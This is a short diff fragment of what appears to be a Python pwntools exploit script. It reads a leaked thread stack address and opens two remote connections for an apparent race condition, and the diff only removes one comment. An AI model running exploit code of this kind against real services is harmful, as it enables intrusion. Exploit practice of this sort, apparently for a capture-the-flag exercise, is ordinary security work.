@@ -115,7 +115,7 @@ thread2_stack_leak = u64(msg[0x160:0x168])
 info("Thread stack leak: " + hex(thread2_stack_leak))
 
 
-# Try to race to write data
+
 p1 = remote(IP, PORT)
 p2 = remote(IP, PORT)
 
